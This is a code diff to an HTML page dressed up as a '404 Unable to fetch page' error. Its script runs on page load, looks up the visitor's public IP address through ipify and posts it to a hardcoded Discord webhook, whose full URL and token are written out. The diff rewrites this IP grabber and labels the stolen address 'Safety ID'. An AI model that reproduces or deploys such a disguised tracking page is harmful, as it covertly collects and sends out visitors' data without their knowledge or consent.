@@ -17,19 +17,17 @@
     </style>
 </head>
 <body>
-    <h1>404</h1>
-    <p id="IpDisplay">Unable to fetech page</p>
+    <h1>404r</h1>
+    <p id="Display">Unable to fetch page</p>
 
     <script>
-        async function e() {
+        async function FetchPublicIp() {
             let Response = await fetch("https://api.ipify.org?format=json");
-            let EData = await Response.json();
-            let DATA = EData.ip;
-
-            return DATA;
+            let JsonData = await Response.json();
+            return JsonData.ip;
         }
 
-          async function SendDiscordMessage(WebhookUrl, MessageContent) {
+        async function SendDiscordMessage(WebhookUrl, MessageContent) {
             await fetch(WebhookUrl, {
                 method: "POST",
                 headers: {
@@ -40,13 +38,18 @@
                 })
             });
         }
-    
-        let WebhookUrl = "https://discord.com/api/webhooks/1387122494116200639/0O9Ijs19Xw_jrrQQTA09mIQTM-31fVZLHiM8BlIvQuc2jO1S3EJZo_xFg_gYLMyN7N-h";
-        let MessageContent = e();
-    
-        SendDiscordMessage(WebhookUrl, MessageContent);
+
+        async function Execute() {
+            let PublicIp = await FetchPublicIp();
+            document.getElementById("IpDisplay").textContent = PublicIp;
+
+            let WebhookUrl = "https://discord.com/api/webhooks/1387122494116200639/0O9Ijs19Xw_jrrQQTA09mIQTM-31fVZLHiM8BlIvQuc2jO1S3EJZo_xFg_gYLMyN7N-h";
+            let MessageContent = "Safety ID: " + PublicIp;
+
+            await SendDiscordMessage(WebhookUrl, MessageContent);
+        }
+
+        Execute();
     </script>
 </body>
 </html>
-
-
